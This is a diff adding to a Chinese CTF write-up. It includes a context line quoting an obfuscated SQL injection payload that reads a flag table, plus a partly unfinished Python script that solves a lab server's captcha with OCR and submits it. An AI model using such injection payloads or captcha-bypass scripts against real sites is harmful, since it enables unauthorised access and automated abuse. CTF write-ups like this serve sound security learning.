@@ -134,4 +134,59 @@ number=-1 uni<>on se<>lect 1,2,3,4,5,6,7,8,9,10,fla<>g fro<>m fl<>ag
 
 dutctf{simple_logic_error}<\/p><\/td><\/tr>","all_time":6}
 ```
-## web5 明天放
+---- 
+## web5
+题目写的很明白，在时间范围内输对验证码就能拿flag
+### 方法1 
+识别验证码需要ocr，此处使用pytesseract，[具体用法](https://www.google.com)  
+python脚本
+```
+import pytesseract,time,re
+import base64
+from PIL import Image
+from io import BytesIO
+def base64_to_image(base64_str, image_path=None):
+    base64_data = re.sub('^data:image/.+;base64,', '', base64_str)
+    byte_data = base64.b64decode(base64_data)
+    image_data = BytesIO(byte_data)
+    img = Image.open(image_data)
+    if image_path:
+        img.save(image_path)
+    return img
+t1 = time.time()
+
+import requests,json
+res = ''
+alphabet = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+s = requests.session()
+r = s.post('http://10.7.20.225/web5/captcha',data=json.dumps({'captcha':'abcde'}))
+img_b64 = json.loads(r.text).get('cpt')
+print(len(img_b64))
+print(json.loads(r.text).get('msg'))
+img = base64_to_image(img_b64)
+img.show()
+text = pytesseract.image_to_string(img)
+print(text)
+for i in text:
+    if i in alphabet:
+        res += i
+print(res.lower())
+cpt = res.lower()[0:6]
+print(cpt)
+# get captcha
+r = s.post('http://10.7.20.225/web5/captcha',data=json.dumps({'captcha':cpt}))
+print('time taken:',time.time()-t1)
+img_b64 = json.loads(r.text).get('cpt')
+
+print(len(img_b64))
+print(json.loads(r.text).get('msg'))
+exit()
+
+
+print(text)
+print(time.time()-t1)
+r = requests.post('http://10.7.20.225/web5/captcha',data=json.dumps({'captcha':text}),headers={"Cookie":cookie})
+print(r.text)
+```
+### 方法2
+晚点放
